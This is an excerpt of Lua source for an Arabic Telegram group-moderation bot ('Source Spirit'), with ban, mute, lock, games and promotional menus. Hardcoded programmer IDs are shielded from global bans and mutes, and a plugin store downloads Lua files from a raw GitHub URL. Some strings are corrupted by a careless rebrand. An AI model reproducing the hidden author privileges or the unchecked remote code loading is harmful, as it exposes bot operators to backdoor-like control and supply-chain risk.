if text and text:match("^وضع قناة الاشتراك ꨄ︎ $") and DevSoFi(msg) then  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' ꨄ︎ حسنآ ارسل لي معرف القناة')
return false  
end
...
send(msg.chat_id_, msg.id_," ꨄ︎ الاشتراك الاجباري مفعل \n ꨄ︎ على القناة  ⇇["..addchusername.."]")
else
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_," ꨄ︎ اهلا عزيزي المطور \n ꨄ︎ ارسل الان معرف قناتك")
end
return false  
end
...
send(msg.chat_id_, msg.id_, " ꨄ︎ تم تعطيل الاشتراك الاجباري ")
return false  
end
if text == "الاشتراك الاجباري " and DevSoFi(msg) then  
if database:get(bot_id..'add:ch:username') then
local addchusername = database:get(bot_id..'add:ch:username')
send(msg.chat_id_, msg.id_, " ꨄ︎ تم تفعيل الاشتراك الاجباري \n ꨄ︎ على القناة  ⇇["..addchusername.."]")
else
send(msg.chat_id_, msg.id_, " ꨄ︎ لا يوجد قناة في الاشتراك الاجباري ")
end
return false  
end
if text == "تفعيل الالعاب" and SudoBot(msg) then
send(msg.chat_id_, msg.id_, ' ꨄ︎ تم تفعيل الالعاب')
database:set(bot_id.."AL:AddS0FI:stats","✔")
end
if text == "تعطيل الالعاب" and SudoBot(msg) then
send(msg.chat_id_, msg.id_, ' ꨄ︎ تم تعطيل الالعاب')
database:set(bot_id.."AL:AddS0FI:stats","✖")
end
...
send(msg.chat_id_, msg.id_, ' ꨄ︎ تم كتم الاسم '..BlNe)
...
send(msg.chat_id_, msg.id_, ' ꨄ︎ تم الغاء كتم الاسم '..delBn)
...
texts = " ꨄ︎ تم مسح الاسماء المكتومه "
send(msg.chat_id_, msg.id_, texts)
end
...
t = "\n ꨄ︎ قائمة الاسماء المكتومه \n⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺ \n"
for k,v in pairs(All_name) do
t = t..""..k.."- (["..v.."])\n"
end
if #All_name == 0 then
t = " ꨄ︎ لا يوجد اسماء مكتومه"
end
send(msg.chat_id_, msg.id_, t)
end
end
if text == "تفعيل كتم الاسم" and Constructor(msg) and database:get(bot_id.."AL:AddS0FI:stats") == "✔" then
send(msg.chat_id_, msg.id_, ' ꨄ︎ تم التفعيل الاسماء المكتومه')
...
send(msg.chat_id_, msg.id_, ' ꨄ︎ تم تعطيل الاسماء المكتومه')
...
send(msg.chat_id_, msg.id_,' ꨄ︎ تم تعيين '..teh..' كتوحيد للمجموعه')
...
send(msg.chat_id_, msg.id_,' ꨄ︎ تم تعين  '..nump..' عدد الكتم')
...
send(msg.chat_id_, msg.id_, ' ꨄ︎ تم تعطيل التوحيد')
...
send(msg.chat_id_, msg.id_, " ꨄ︎ عزيزي >>["..mrsofi2.username_.."](https://t.me/"..(mrsofi2.username_ or "come_here_to_get")..")\n ꨄ︎ عليك وضع التوحيد ⪼ {"..database:get(bot_id.."DRAGON:teh"..msg.chat_id_).."} بجانب اسمك\n ꨄ︎ عدد المحاولات المتبقيه {"..(tonumber(mrsofi_nnn) - tonumber(mrsofi_nnn2)).."}")
end
end
end
end
...
local Text = [[ 
 ─────── ꨄ︎ ───────
 ꨄ︎ لستخدام المميزات اتبع مايلي ⇈⇊
 ─────── ꨄ︎ ───────
 ꨄ︎ قران ⤌ لعرض الميزه
 ꨄ︎ اذكار ⤌ لعرض الميزه
 ꨄ︎ الصلاوات ⤌ لعرض الميزه
 ꨄ︎ متحركه ⤌ لعرض الميزه
 ꨄ︎ غنيلي ⤌ لعرض الميزه
 ꨄ︎ بوستات ⤌ لعرض الميزه
 ꨄ︎ استوري ⤌ لعرض الميزه
 ꨄ︎ تصميم ⤌ لعرض الميزه
 ꨄ︎ حساب العمر ⤌ لعرض الميزه
 ꨄ︎ حساب الوزن ⤌ لعرض الميزه
 ꨄ︎ نسبه الحب ⤌ لعرض الميزه
 ꨄ︎ نسبه الغباء ⤌ لعرض الميزه
 ꨄ︎ جمالي ⤌ لعرض الميزه
 ꨄ︎ افلام ⤌ لعرض الميزه
 ꨄ︎ اغاني ⤌ لعرض الميزه
 ꨄ︎ روايات ⤌ لعرض الميزه
 ꨄ︎ ثمات ⤌ لعرض الميزه
 ꨄ︎ همسه ⤌ لعرض الميزه
 ꨄ︎ معني + اسمك ⤌ لعرض الميزه
 ꨄ︎ خلفيات ⤌ لعرض الميزه
▱▰▱▰▱▰▱▰▱▰▱▰▱▰
𓆩 𝗖𝗛 - [ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐏𝐈𝐑𝐈𝐓 ](t.me/come_here_to_get)𓆪
▱▰▱▰▱▰▱▰▱▰▱▰▱▰
]]
keyboard = {}  
keyboard.inline_keyboard = { 
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/come_here_to_get/406&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'السورس' or text == 'سورس' or text == 'يا سورس' or text == 'راستي' then
local Text = [[
╭▱▰▱▰𓆩[ 𝐒𝐏𝐈𝐑𝐈𝐓 ](http://t.me/come_here_to_get)𓆪▱▰▱▰╮
┆
┆[𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐏𝐈𝐑𝐈𝐓](http://t.me/come_here_to_get)
┆
╰▱▰▱▰𓆩[ 𝐒𝐏𝐈𝐑𝐈𝐓 ](http://t.me/come_here_to_get)𓆪▱▰▱▰╯
]]
keyboard = {} 
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/MADI_PICK/34&caption=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
local Text = [[
𓆩 اهلا بك فيسورس سبريت الجمدان 𓆪
𓆩 عايز بوت بأسعار منسبه وبوت مميز كلمني 𓆪
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '• ᴅᴇᴠ ᴍᴀᴅɪsᴏɴ ♪',url="t.me/AAHMEED11"},{text = '• ʙᴏᴛ ᴍᴀᴅɪsᴏɴ ♪', url="t.me/M_A_DD_BOT"}},
{{text = '• ᴅᴇᴠ sᴘɪʀɪᴛ ♪',url="t.me/spiritc1"},{text = '• ʙᴏᴛ sᴘɪʀɪᴛ ♪', url="t.me/spirit5_bot"}},
{{text = '`𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐏𝐈𝐑𝐈𝐓´', url="t.me/come_here_to_get"}},
{{text = 'أضغط لاضافه ألبوت لمجموعتك 𖠪' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}}, 
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/MADI_PICK/34&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/Qwressv/162&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == 'ماديسون' or text == 'المبرمج ماديسون' or text == 'صاحب السورس' or text == 'مبرمج السورس' then
local Text = [[
ماديسون مبرمج السورس لو حابب تتواصل معاه
اتبع الزر إلى تحت ⇈⇊
]]
keyboard = {} 
keyboard.inline_keyboard = {
...
if text == 'المبرمج سبريت' or text == 'سبريت' or text == 'taha 7x' or text == '²مبرمج السورس' then
local Text = [[
سبريتمبرمج السورس² لو حابب تتواصل معاه
اتبع الزر إلى تحت ⇈⇊
]]
keyboard = {} 
keyboard.inline_keyboard = {
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/spiritc1&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
if text == 'المبرمج اصيل' or text == 'اصيل' or text == 'عوز انصب بوت' or text == '⁴مبرمج السورس' then
local Text = [[
اصيل مبرمج السورس⁴ لو حابب تتواصل معاه
اتبع الزر إلى تحت ⇈⇊
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '• ᴅᴇᴠ ᴍᴀᴅɪsᴏɴ ♪',url="t.me/spiritc1"}},
{{text = 'أضغط لاضافه ألبوت لمجموعتك 𖠪' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}}, 
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/spiritc1&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == '⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺' or text == 'عاوز بوت' then
local Text = [[ 
من أحسن السورسات على التليجرامسورس سبريت
...
keyboard.inline_keyboard = { 
{{text = '𓆩 مبرمج السورس 𓆪', url="t.me/AAHMEED11"}}, 
{{text = '𓆩 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐏𝐈𝐑𝐈𝐓 𓆪', url="t.me/come_here_to_get"}}, 
{{text = '𓆩 ᴛᴡᴀѕʟ sᴏᴜʀᴄᴇ 𓆪', url="t.me/E_H_M_BOT"}}, 
} 
local msg_id = msg.id_/2097152/0.5
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/come_here_to_get&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == 'يوتيوب' or text == 'بحث' or text == 'اليوتيوب' then
local Text = [[
𓆩 اليـك بـوتات تحـميل 𓆪
𓆩 مـن جمـيع ألـمـواقع 𓆪

]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𓆩 بوت اليوتيوب 𓆪',url="t.me/Qeaa_bot"}},
{{text = '𓆩 بوت تيك توك 𓆪',url="t.me/K0XBOT"}},
{{text = '𓆩 بوت انستقرام 𓆪',url="t.me/J33Bot"}},
{{text = '𓆩 بوت قران 𓆪',url="t.me/quran_lbot"}},
{{text = '𓆩 بوت تمويل 𓆪',url="t.me/tmwelEgyptbot"}},
}
local msg_id = msg.id_/2097152/0.5
...
{{text = '📖رواية "أرض زيكولا"',url="https://t.me/come_here_to_get"}},
{{text = '📖موسوعة الظلام رعب وما شابه ذلك', url="https://t.me/barfrends/263376"}},
{{text = '📖رواية "الشفق الجزء الأول"', url="https://t.me/come_here_to_get"}},
{{text = '📖رواية "المخلوق', url="https://t.me/come_here_to_get"}},
{{text = '📖رواية "بعد النسيان"', url="https://t.me/t.me/come_here_to_get"}},
{{text = '📖كتاب في حضرة الجن', url="https://t.me/https://t.me/t.me/come_here_to_get"}},
{{text = '📖رواية "واختفى كل شئ"', url="https://t.me/t.me/come_here_to_get"}},
{{text = '📖رواية "نيلوفر أسود"', url="https://t.me/t.me/come_here_to_get"}},
{{text = '📖رواية"جثة في الفندق"', url="https://t.me/t.me/come_here_to_get"}},
{{text = '📖رواية "في القطار السريع"', url="https://t.me/t.me/come_here_to_get"}},
{{text = '📖لقاء مع كاتب رعب"', url="https://t.me/t.me/come_here_to_get"}},
{{text = '📖رواية"الإنسان الأخير""', url="https://t.me/t.me/come_here_to_get"}},
{{text = '📖رواية" مقبرة الحيوانات""', url="https://t.me/come_here_to_get"}},
{{text = '`𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐏𝐈𝐑𝐈𝐓´', url="t.me/come_here_to_get"}},
{{text = 'أضغط لاضافه ألبوت لمجموعتك 𖠪' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}}, 
}
local msg_id = msg.id_/2097152/0.5  
...
local Text = [[
مطورين ومبرمجينسورس سبريت اتبع الازرار للتواصل معهم ⇈⇊
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'ماديسون مبرمج السورس',url="t.me/AAHMEED11"}},
{{text = 'سبريتمبرمج السورس',url="t.me/spiritc1"}},
{{text = 'عمر مبرمج السورس',url="t.me/BOT3mora"}},
{{text = 'اصيل مبرمج السورس',url="t.me/spiritc1"}},
{{text = '`𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐏𝐈𝐑𝐈𝐓´', url="t.me/come_here_to_get"}},
{{text = 'أضغط لاضافه ألبوت لمجموعتك 𖠪' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}}, 
}
local msg_id = msg.id_/2097152/0.5
...
if text == "بوستات بالصور" then  
ght = math.random(1,33);  
local Text ='مرحبا اليك بوسات بي الصوره 🌚❤️'  
keyboard = {}   
keyboard.inline_keyboard = {  
{{text = '`𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐏𝐈𝐑𝐈𝐓´', url="t.me/come_here_to_get"}},
{{text = 'أضغط لاضافه ألبوت لمجموعتك 𖠪' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}}, 
...
local Text ='مرحبا اليك معلومه جديده في صوره 🌚❤️' 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '`𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐏𝐈𝐑𝐈𝐓´', url="t.me/come_here_to_get"}},
{{text = 'أضغط لاضافه ألبوت لمجموعتك 𖠪' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}}, 
...
"ينفع احضنك؟ ", 
"قولي ع اكبر غلسبريتندمان عليهاا؟ ", 
"عندك كام سنه؟ ", 
...
"وش نوع الأفلام اللي تحب تتابعه؟ ",
  ...
  "وش الإسم اللي دايم تحسبريتبالبرامج؟ ",
  "وش برجك؟ ",
...
"‏ ‏مقماديسون عالنسيان ولو طال الزمن 🖤",
...
"مرة واحد غبي معاه عربية قديمة جدًا وبيحاول يبيعها وماحدش راضي يشتريها.. راح لصاحبه حكاله المشكلة.. صاحبه قاله عندي لك فكرة جهنمية هاتخليها تتباع الصبح.. أنت تجيب علامة مرسيدس وتحسبريتا عليها. بعد أسبوعين صاحبه شافه صدفة قاله بعت العربية ولا لاء؟ قاله انت  مجنون؟ حد يبيع مرسيدس؟ 🤓😂",
...
"لو خيروك |  بين تناول البيتزا وبين الآيس سبريتوذلك بشكل دائم؟ ",
...
"لو خيروك |  بين تنظيف شعرك بسائل غسيل الأطباق وبين استخدام سبريتالأساس لغسيل الأطباق؟ ",
...
local iduser = userid 
send(msg.chat_id_, msg.id_,'  ꨄ︎ الايدي ⇇↝'..iduser..'↜\n ꨄ︎ المعرف ⇇↝'..username..'↜\n ꨄ︎ الرتبه ⇇↝'..rtp..'↜\n ꨄ︎ نوع الكشف ⇇بالمعرف \n ꨄ︎ سعر الكشف 50جنيه 😹') 
end,nil) 
else 
send(msg.chat_id_, msg.id_,'  ꨄ︎ المعرف غير صحيح') 
end 
end 
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil) 
end
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐏𝐈𝐑𝐈𝐓](t.me/come_here_to_get)
...
if text == 'العاب' then
local Text = [[ 
𓆩مرحبا اليك العابسورس سبريت الافضل𓆪
 ]]  
keyboard = {}   
keyboard.inline_keyboard = {  
...
send(msg.chat_id_, msg.id_, '\n ꨄ︎ عذرا لا تستطيع حظر ( '..Rutba(result.sender_user_id_,msg.chat_id_)..' )')
end
...
send(msg.chat_id_, msg.id_,' ꨄ︎ تم ازالة جميع الاوامر المضافه')  
end
end
...
send(msg.chat_id_, msg.id_,' ꨄ︎ ارسل الامر القديم')  
return false
end
...
send(msg.chat_id_, msg.id_,' ꨄ︎ ارسل الامر الذي قمت بوضعه بدلا عن القديم')  
return false
end
end
if text and database:get(bot_id.."Set:Cmd:Group"..msg.chat_id_..':'..msg.sender_user_id_) == 'true' then
database:set(bot_id.."Set:Cmd:Group:New"..msg.chat_id_,text)
send(msg.chat_id_, msg.id_,' ꨄ︎ ارسل الامر الجديد')  
...
send(msg.chat_id_, msg.id_,' ꨄ︎ تم حفظ الامر')  
...
local function taha(extra, taha, success)
if taha.photos_[0] then
local Name = '[معاك مطور البوت اهو ياروحي ⇈⇊](t.me/come_here_to_get)\n['..result.first_name_..'](tg://user?id='..result.id_..')\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = ''..result.first_name_..'', url = "https://t.me/"..result.username_..""},
...
send(msg.chat_id_, msg.id_, ' ꨄ︎ مـن قبـل  ⇇ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n⦁ تم تفعيل التنظيف التلقائي* ')
return false
end
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ꨄ︎ تم تعطيل جلب الصوره ،\n ꨄ︎ تم قفل البوتات  ،\n ꨄ︎ تم قفل التكرار ،\n ꨄ︎ تم قفل الروابط ،\n ꨄ︎ تم قفل التوجيه ،\n ꨄ︎ تم قفل الملصقات ،\n ꨄ︎ تم قفل المتحركه ،\n ꨄ︎ تم قفل الفيديو ،\n ꨄ︎ تم قفل الفشار ،\n ꨄ︎ تم قفل الانلاين ،\n ꨄ︎ تم قفل تعديل المديا ،\n ꨄ︎ تم وضع التكرار  ،\n ꨄ︎ تم قفل الفارسيه  ،\n ꨄ︎ تم وضع الايدي بدون صوره ،n  \n ꨄ︎ تم تفعيل الحمايه  بواسسبريت، [↝'..Rutba(msg.sender_user_id_,msg.chat_id_)..'↜](T.ME/'..(data.username_ or 'textchuser')..')  ')
end,nil)   
end
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ꨄ︎ تم تفعيل جلب الصوره ،\n ꨄ︎ تم  فتح البوتات  ،\n ꨄ︎ تم  فتح التكرار ،\n ꨄ︎ تم  فتح الروابط ،\n ꨄ︎ تم  فتح التوجيه ،\n ꨄ︎ تم  فتح الملصقات ،\n ꨄ︎ تم  فتح المتحركه ،\n ꨄ︎ تم  فتح الفيديو ،\n ꨄ︎ تم  فتح الفشار ،\n ꨄ︎ تم  فتح الانلاين ،\n ꨄ︎ تم  فتح تعديل المديا ،\n ꨄ︎ تم وضع التكرار  ،\n ꨄ︎ تم  فتح الفارسيه  ،\n ꨄ︎ تم وضع الايدي بصوره،n \n ꨄ︎ تم تفعيل الحمايه  بواسسبريت، [↝'..Rutba(msg.sender_user_id_,msg.chat_id_)..'↜](T.ME/'..(data.username_ or 'textchuser')..')  ')
end,nil)   
end
...
Text = ' ꨄ︎ تم تفعيل امر غنيلي الان ارسل غنيلي'
database:del(bot_id..'sing:for:me'..msg.chat_id_)  
else
Text = ' ꨄ︎ بالتاكيد تم تفعيل امر غنيلي تستطيع ارسال غنيلي'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
Text = '\n ꨄ︎ تم تعطيل نسبه الانوثه'
else
Text = '\n ꨄ︎ بالتاكيد تم تعطيل نسبه الانوثه'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل all' and CoSu(msg) then   
if database:get(bot_id..'Cick:all'..msg.chat_id_) then
Text = ' ꨄ︎ تم تفعيل امر @all'
database:del(bot_id..'Cick:all'..msg.chat_id_)  
else
Text = ' ꨄ︎ بالتاكيد تم تفعيل امر @all'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ꨄ︎  مـن قبـل  ⇇[↝'..Rutba(msg.sender_user_id_,msg.chat_id_)..'↜](T.ME/'..(data.username_ or 'textchuser')..') \n ꨄ︎ تـم قفـل التاك بالتقييد ')
end,nil)   
elseif text == 'قفل التاك بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:hashtak"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ꨄ︎  مـن قبـل  ⇇['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'textchuser')..') \n ꨄ︎ تـم قفـل التاك بالكتم ')
end,nil)   
elseif text == 'قفل التاك بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:hashtak"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ꨄ︎  مـن قبـل  ⇇[↝'..Rutba(msg.sender_user_id_,msg.chat_id_)..'↜](T.ME/'..(data.username_ or 'textchuser')..') \n ꨄ︎ تـم قفـل التاك بالطرد ')
end,nil)   
...
send(msg.chat_id_, msg.id_, " ꨄ︎ لا يمكنك حظر المطور الاساسي \n")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ꨄ︎ لا تسطيع حظر البوت عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1208165035) then  
send(msg.chat_id_, msg.id_, " ꨄ︎ لا تسطيع حظر المبرمج ماديسون عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1855896470) then  
send(msg.chat_id_, msg.id_, " ꨄ︎ لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
if tonumber(result.sender_user_id_) == tonumber(92029473829) then  
send(msg.chat_id_, msg.id_, " ꨄ︎ لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
function(arg,data) 
usertext = '\n ꨄ︎ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n ꨄ︎ تم حظره عام من {'..Groups..'} مجموعه'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
...
send(msg.chat_id_, msg.id_, " ꨄ︎ لا يمكنك حظر المبرمج ماديسون عام\n")
return false 
end
if result.id_ == tonumber(1855896470) then
send(msg.chat_id_, msg.id_, " ꨄ︎ لا يمكنك حظر مبرمج السورس\n")
return false 
end
...
if result.id_ == tonumber(92029473829) then
send(msg.chat_id_, msg.id_, " ꨄ︎ لا يمكنك حظر مبرمج السورس \n")
return false 
end
usertext = '\n ꨄ︎ العضو ← ['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n ꨄ︎ تم حظره عام من {'..Groups..'} مجموعه'
texts = usertext..status
...
if tonumber(userid) == tonumber(1855896470) then  
send(msg.chat_id_, msg.id_, " ꨄ︎ لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
if tonumber(userid) == tonumber(92029473829) then  
send(msg.chat_id_, msg.id_, " ꨄ︎ لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(SUDO) then
send(msg.chat_id_, msg.id_, " ꨄ︎ لا يمكنك كتم المطور الاساسي \n")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ꨄ︎ لا تسطيع كتم البوت عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1208165035) then  
send(msg.chat_id_, msg.id_, " ꨄ︎ لا تسطيع كتم المبرمج ماديسون عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1855896470) then  
send(msg.chat_id_, msg.id_, " ꨄ︎ لا تسطيع كتم مبرمج السورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1849514102) then  
send(msg.chat_id_, msg.id_, " ꨄ︎ لا تسطيع كتم مبرمج السورس عام")
...
function(arg,data) 
usertext = '\n ꨄ︎ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n ꨄ︎ تم كتمه عام من {'..Groups..'} مجموعه'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
if result.id_ == tonumber(1208165035) then
send(msg.chat_id_, msg.id_, " ꨄ︎ لا يمكنك كتم المبرمج ماديسون عام\n")
return false 
end
if result.id_ == tonumber(1855896470) then
send(msg.chat_id_, msg.id_, " ꨄ︎ لا يمكنك كتم مبرمج السورس\n")
return false 
end
if result.id_ == tonumber(1849514102) then
send(msg.chat_id_, msg.id_, " ꨄ︎ لا يمكنك كتم مبرمج السورس \n")
...
usertext = '\n ꨄ︎ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n ꨄ︎ تم الغاء (الحظر-الكتم) عام من {'..Groups..'} مجموعه'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
...
send(msg.chat_id_, msg.id_, "\n ꨄ︎ تم مسح قائمة المطورين  ")
end
if text == ("المطورين") and DevSoFi(msg) then
local list = database:smembers(bot_id..'Sudo:User')
t = "\n ꨄ︎  قائمة مطورين البوت \n⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
...
t = ' ꨄ︎ ملفات السورسسبريت ⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺\n ⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺ \n'
i = 0
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
i = i + 1
...
if Get_info then
local TextS = "\n ꨄ︎ اهلا بك في متجر ملفاتسبريت\n ꨄ︎ ملفات السورس ⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺\n◤━───━??𝗼𝗼𝗼𝗻━───━◥\n\n"
local TextE = "\n⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺\n ꨄ︎ علامة تعني { ✔️ } ملف مفعل\n ꨄ︎ علامة تعني { ✖ } ملف معطل\n ꨄ︎ قناةسورس سبريت⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺\n".." ꨄ︎ [اضغط هنا لدخول](t.me/come_here_to_get) \n"
local NumFile = 0
...
send(msg.chat_id_, msg.id_," ꨄ︎ لا يوجد اتصال من ال api \n") 
end
return false
end
end
...
t = " ꨄ︎ بالتاكيد تم تعطيل ملف → "..file.."\n"
end
...
send(msg.chat_id_, msg.id_," ꨄ︎ عذرا الملف لايدعمسورس سبريت\n") 
end
return false
end
...
if file_bot then
io.close(file_bot)
t = " ꨄ︎ بالتاكيد تم تفعيل ملف → "..file.." \n"
else
t = " ꨄ︎ الملف  ⇇"..file.."\n ꨄ︎ تم تفعيل ملف \n"
end
local json_file, res = https.request("https://raw.githubusercontent.com/Ffasit/photo/main/File_Bot/"..file)
...
send(msg.chat_id_,msg.id_," ꨄ︎ تم مسح الملفات")
return false
end
...
send(msg.chat_id_, msg.id_,' ꨄ︎ لا ����ستطيع استخدام البوت \n ꨄ︎  يرجى الاشتراك بالقناه اولا \n ꨄ︎  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
...
Reply_Status(msg,result.sender_user_id_,"reply"," ꨄ︎ تم ترقيته مساعد في البوت")  
end
...
Reply_Status(msg,result.id_,"reply"," ꨄ︎ تم ترقيته مساعد في البوت")  
else
send(msg.chat_id_, msg.id_," ꨄ︎ لا يوجد حساب بهاذا المعرف")
end
end
...
Reply_Status(msg,userid,"reply"," ꨄ︎ تم ترقيته مساعد في البوت")  
return false 
end
if text == ("تنزيل المساعد") and SudoBot(msg) then
function Function_DRAGON(extra, result, success)
local id = bot_data:get(ban_id.."id:msa3d:ban")
Reply_Status(msg,id,"reply"," ꨄ︎ تم تنزيله من المساعد")  
bot_data:del(ban_id.."msa3d:ban")
...
if text == ("مسح قائمهسبريت") and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n ꨄ︎ تم مسح قائمهسبريت')
return false
end

if text == 'قائمهسبريت' and Sudo(msg) then
...
if #list == 0 then
t = " ꨄ︎ لا يوجد احد في قائمهسبريت"
end
send(msg.chat_id_, msg.id_, t)
return false
end
...
local list = database:smembers(bot_id..'CoSu'..msg.chat_id_)
t = "\n ꨄ︎ وينكم تعالو يريدوكم بالجروب \n⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- {[@"..username.."]}\n"
...
if #list == 0 then
